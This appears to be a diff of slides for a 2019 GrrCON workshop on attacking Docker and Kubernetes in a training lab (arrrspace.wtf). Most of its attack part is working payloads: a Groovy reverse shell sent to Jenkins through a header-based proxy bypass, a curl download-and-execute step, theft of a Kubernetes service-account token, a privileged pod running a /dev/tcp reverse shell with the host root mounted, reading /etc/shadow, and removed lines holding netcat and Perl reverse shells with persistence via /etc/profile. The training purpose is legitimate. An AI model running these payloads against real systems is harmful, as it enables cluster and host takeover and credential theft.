@@ -260,11 +260,13 @@
 						```
 					</section>
 					<section data-markdown>
-						#### Explanation
-						- Identified that we were in a Docker container
-						- Located the Docker socket which happened to be mounted to the container
-						- Used the docker socker to recon what containers and images are on the host system
-						- Used the docker socket to create our own malicious container with the host file system bind mounted and a reverse shell connection
+						<script type="text/template">
+							#### Explanation
+							- Identified that we were in a Docker container <!-- .element: class="fragment" data-fragment-index="1" -->
+							- Located the Docker socket which happened to be mounted to the container <!-- .element: class="fragment" data-fragment-index="2" -->
+							- Used the docker socker to recon what containers and images are on the host system <!-- .element: class="fragment" data-fragment-index="3" -->
+							- Used the docker socket to create our own malicious container with the host file system bind mounted and a reverse shell connection <!-- .element: class="fragment" data-fragment-index="4" -->
+						</script>
 					</section>
 				</section>
 				<section>
@@ -305,11 +307,13 @@
 						[The most pointless docker command ever](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/)
 					</section>
 					<section data-markdown>
-						#### Explanation
-						- Figured out what user we were
-						- Found that we don't have very many permissions
-						- Found that we belong to the docker group
-						- Leverage our ability to run docker to elevate our privileges to root
+						<script type="text/template">
+							#### Explanation
+							- Figured out what user we were <!-- .element: class="fragment" data-fragment-index="1" -->
+							- Found that we don't have very many permissions <!-- .element: class="fragment" data-fragment-index="2" -->
+							- Found that we belong to the docker group <!-- .element: class="fragment" data-fragment-index="3" -->
+							- Leverage our ability to run docker to elevate our privileges to root <!-- .element: class="fragment" data-fragment-index="4" -->
+						</script>
 					</section>
 				</section>
 				<section>
@@ -326,83 +330,143 @@
 						Little do we know that there is more to this application than meets the eye...
 					</section>
 					<section data-markdown>
-						#### Let's get setup
-						- Fire up BurpSuite: applications -> Samurai WTF -> Burp Suite
-							- Create a temp project
-							- Configure your scope to allow `^*arrrspace.wtf`
-						- Open up Chrome: applications -> Internet -> Google Chrome
-							- Set the Foxy Proxy plugin to `127.0.0.1:8080`
-							- Navigate to [arrrspace.wtf](http://arrrspace.wtf)
+						<script type="text/template">
+							#### Let's get setup
+							- Fire up BurpSuite: applications -> Samurai WTF -> Burp Suite <!-- .element: class="fragment" data-fragment-index="1" -->
+							- Create a temp project <!-- .element: class="fragment" data-fragment-index="2" -->
+							- Configure your scope to allow ^*arrrspace.wtf <!-- .element: class="fragment" data-fragment-index="3" -->
+							- Open up Chrome: applications -> Internet -> Google Chrome <!-- .element: class="fragment" data-fragment-index="4" -->
+							- Set the Foxy Proxy plugin to 127.0.0.1:8080 <!-- .element: class="fragment" data-fragment-index="5" -->
+							- Navigate to arrrspace.wtf <!-- .element: class="fragment" data-fragment-index="6" -->
+						</script>
 					</section>
-					<seciton data-markdown>
+					<section data-markdown>
 						#### Mapping
 						Map out the web application by simply browsing to every part of it that you can.
 						This is standard web application pentesting practice.
-					</seciton>
-					<section data-markdown>
-						#### Discovery
-						Notice how the (broken) login form makes a reqeust to `api.arrrspace.wtf`?
-						Send that request to BurpSuite repeater for some manual tampering.
-						- Right click the request and then click "send to repeater" or press Ctrl-R
 					</section>
 					<section data-markdown>
-						```bash
-						read -r -d '' POD <<-'EOF'
-						apiVersion: v1
-						kind: Pod
-						metadata:
-						    name: evil-pod
-						spec:
-						    containers:
-						    - name: evil-container 
-						      image: ubuntu:latest
-						      command: ["sleep", "infinity"]
-						      securityContext:
-						        privileged: true
-						      volumeMounts:
-						      - mountPath: /mnt/host
-						        name: evil-volume
-						        mountPropagation: Bidirectional
-						    volumes:
-						    - name: evil-volume
-						      hostPath:
-						        path: /
-						EOF
+						<script type="text/template">
+							#### Discovery
+							Through our mapping we should see that the web applicaiton makes a request to api.arrrspace.wtf
+							Let's poke at that api a bit further <!-- .element: class="fragment" data-fragment-index="1" -->
+						</script>
+					</section>
+					<section data-markdown>
+						#### Digging a little deeper
+						In a real pentest we would try to tease out a lot more intereseting behaviours then we're going to do today.
+						Instead we're just going to skip stright to doing some automated discovery for hidden headers.
+						Doing this is useful, we want to find a way to force the API to make requests that it shouldn't, allowing us to 
+						get a feeling for what lives behind it.
+					</section>
+					<section data-markdown>
+						#### Automated Discover
+						Eventually through a combination of educated guessing more manual request tampering and continued automated
+						discovery we should be able to put it together that the the API will forward requests using a combination of the
+						X-Original-Host HTTP header
+						</script>
+					</section>
+					<section data-markdown>
+						#### Exploitation 1 - She pops shells down by the seashore
+						By now we've discovered that there is a default Jenkins instance sitting behind the API gateway.
+						We've also figured out that we can make requests to the Kuberentes API by way of the API gateway.
+						At this point there are a few paths we could take. One is clean, they other dirty. The dirty way is more
+						run, so let's do that :)
+					</section>
+					<section data-markdown>
+						#### Exploitation 1 Cont.
+						Start up a netcat listener on your attack machine and then repeat the following HTTP request with BurpSuite.
+						```
+						POST / HTTP/1.1
+						Host: api.arrrspace.wtf
+						X-Original-Host: http://jenkinssvc:8080/scriptText
+						Content-Type: application/x-www-form-urlencoded
+						Content-Length: 566
+
+						script=String host="10.0.2.15";
+						int port=4444;
+						String cmd="bash";
+						Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+						Socket s=new Socket(host,port);
+						InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+						while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};
+						p.destroy();s.close();
 						```
 					</section>
 					<section data-markdown>
-						```bash
-						cat << EOF > ./groovy.payload
-						def command = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
-						def proc = command.execute()
-						proc.waitFor()
-						println "\${proc.in.text}"
-						EOF
+						#### Upgrade our shell
+						```
+						# In reverse shell
+						python -c 'import pty; pty.spawn("/bin/bash")'
+						Ctrl-Z
+						# On your attack box 
+						stty --all # note the rows and columns
+						stty raw -echo
+						fg
+						# In reverse shell
+						reset
+						export SHELL=bash
+						export TERM=xterm-256color
+						stty rows n columns n 
 						```
 					</section>
 					<section data-markdown>
+						#### Infiltrate enum4k8s
+						On the host machine start run the following in the /home/samurai/tools dir
+						```python
+						python -m SimpleHTTPServer  
+						```
+						Now in your reverse shell run the following
 						```bash
-						JENKINS_TOKEN=`curl -d "script=$(<./groovy.payload)" -X POST http://10.104.236.89:8080/scriptText`
-						# look for images already being used on the cluster.
-						curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" $KUBE/api/v1/namespaces/default/pods 2>&1| grep -i \"image\":
-						curl -k -XPOST -H "Content-Type: application/yaml" -H "Authorization: Bearer ${JENKINS_TOKEN}" -d "$POD" https://10.96.0.1:443/api/v1/namespaces/default/pods
-						curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod
-						curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" \
-						    -H "Connection: Upgrade" \
-						    -H "Upgrade: websocket" \
-						    -H "Host: blah.com:80" \
-						    -H "Origin: http://blah.com:80" \
-						    -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
-						    -H "Sec-WebSocket-Version: 13" \
-						    'https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod/exec?command=/bin/bash&command=-c&command=apt%20update%26%26apt%20install%20-y%20netcat%3bnetcat%20-e%20/bin/sh%2010.0.2.15%204444&stdin=true&stdout=true&stderr=true'
+						# find a writable directory
+						find / -writable
+						# in chosen dir
+						curl -fsSL http://10.0.2.15:8000/ek4 -o .e4k
+						chmod +x e4k && ./e4k -h
 						```
 					</section>
 					<section data-markdown>
+						#### Enumerating the cluster from the inside
+						We can gather some useful info about the cluster from inside the jenkinssvc pod
 						```bash
-						cat << EOF > /mnt/host/rshell
-						use Socket;\$i="10.0.2.15";\$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
-						EOF
-						echo "/usr/bin/perl -U /rshell &" >> /etc/profile
+						ENV
+						./e4k
+						export T=$(cat /var/run/secrets/kubernetes.io/serviceaccoutn/token)
+						```
+					</section>
+					<section data-markdown>
+						#### Wait, what was that last one?
+						Yeah, we just read the jenkinssvc's cluster service account JWT into an env variable :)
+						Let's do some enumeration now, and see what this serviceaccount can do
+						```bash
+						./e4k -jwt $T > cluster_enum.txt
+						./e4k -jwt $T -dump > cluster_enum.dump
+						```
+						We could also be cheeky an inflitrate kubectl itself >:)
+					</section>
+					<section data-markdown>
+						#### Let's Deploy an evil pod
+						The last thing we're going to do in this workshop is deploy a pod that runs a 
+						reverse shell on startup and has the host root fs mounted as a bidirectional bind
+						mount to the pod containers.
+						```bash
+						./e4k -jwt $T -deploy \
+							-img ubuntu \
+							-cmd '["bash","-c","bash -i >& /dev/tcp/10.0.2.15/5555 0>&1"]' \
+							-name foo
+						```
+						P.S. we could have used kubectl do acheive a similar result with a few extra steps.
+						Also, I aim to improve this tool a lot more going forwards, it's a bit of a chore to use...
+					</section>
+					<section data-markdown>
+						#### Well, let's compromise the host system of this node!
+						```
+						# in reverse shell
+						cat /mnt/host/etc/shadow
+						echo "I'm mary poppins ya'll" > /mnt/host/etc/yonduwuzhere.txt
+						# on your host
+						ls -l /etc/yonduwuzhere.txt
+						sudo cat /etc/yonduwuzhere.txt
 						```
 					</section>
 				</section>
@@ -410,18 +474,21 @@
 					# That's it folks!
 				</section>
 				<section data-markdown>
+					We barely scratched the surface of the things that we could do, but hopefully you
+					had some fun, and learned a few new tricks!
+				</section>
+				<section data-markdown>
 					## I'd like to thank
 					- My employer [Secure Ideas, LLC](www.secureideas.com)
 						- I'm biased, but if you want good pentests then check us out :)
 					- Everybody that I get to work with every day, because they all rock
-					- Alex and Ochaun for helping out and hanging out
 					- Everybody who attended the workshop
 				</section>
 				<section data-markdown>
 					# And last but not least...
 				</section>
 				<section data-markdown>
-					## The organizers of this years (2019) [GrrCon](https:///)
+					## The organizers of this years (2019) [GrrCON](http://grrcon.com)
 				</section>
 				<section>
 					<section data-markdown>
@@ -433,6 +500,9 @@
 						- Carrier Pigeon: It just knows where to go, okay
 						- Lat,Lon of my secret base: [24.9999993,-71.0087548](https://www.google.com/maps/place/Bermuda+Triangle/@24.9999993,-71.0087548,15z/data=!4m13!1m7!3m6!1s0x89451ab5034cb7ab:0xb600ecf3df7aca4d!2sBermuda+Triangle!3b1!8m2!3d25!4d-71!3m4!1s0x89451ab5034cb7ab:0xb600ecf3df7aca4d!8m2!3d25!4d-71)
 							- No solicitation, please
+						- [Arrrspace Github](https://github.com/ProfessionallyEvil/arrrspace)
+						- [SamuraiWTF Github](https://github.com/SamuraiWTF/samuraiwtf)
+						- [Harpoon Github](https://github.com/ProfessionallyEvil/harpoon)
 					</section>
 				</section>
 			</div>
